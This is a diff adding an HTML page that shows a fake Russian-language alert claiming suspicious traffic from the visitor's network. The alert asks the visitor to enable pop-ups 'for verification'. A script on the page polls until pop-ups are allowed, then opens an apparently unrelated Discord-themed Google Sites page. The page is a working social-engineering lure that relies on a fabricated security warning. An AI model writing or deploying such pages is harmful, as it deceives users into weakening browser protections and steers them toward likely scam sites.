@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 20px;
+}
+
+h1 {
+  color: #333;
+}
+
+.button {
+  display: inline-block;
+  font-size: 16px;
+  padding: 10px 20px;
+  margin-top: 20px;
+  background-color: #4CAF50;
+  color: #fff;
+  text-decoration: none;
+  border-radius: 4px;
+}
+
+.button:hover {
+  background-color: #45a049;
+}
+</style>
+<script>
+function openWebsite() {
+  var url = "https://sites.google.com/view/discord-dreamdragon-widget/home";
+  window.open(url, "_blank");
+}
+
+function openPopupInstructions() {
+  var url = "https://x1vova1x.github.io/popup.dreamdragon/";
+  window.open(url, "_blank");
+}
+
+window.onload = function() {
+  var mainHeading = document.createElement("h1");
+  mainHeading.textContent = "Мы зарегистрировали подозрительный трафик из вашей сети. Разрешите всплывающие окна для подтверждения.";
+  document.body.appendChild(mainHeading);
+
+  var popupInstructionsButton = document.createElement("a");
+  popupInstructionsButton.href = "#";
+  popupInstructionsButton.textContent = "Как включить всплывающие окна";
+  popupInstructionsButton.className = "button";
+  popupInstructionsButton.onclick = function() {
+    openPopupInstructions();
+  };
+  document.body.appendChild(popupInstructionsButton);
+
+  var checkPopupInterval = setInterval(function() {
+    var popupBlocked = false;
+    try {
+      var newWindow = window.open("", "_blank");
+      if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+        popupBlocked = true;
+      } else {
+        newWindow.close();
+      }
+    } catch (error) {
+      popupBlocked = true;
+    }
+
+    if (!popupBlocked) {
+      clearInterval(checkPopupInterval);
+      openWebsite();
+    }
+  }, 1000);
+};
+</script>
+</head>
+<body>
+</body>
+</html>
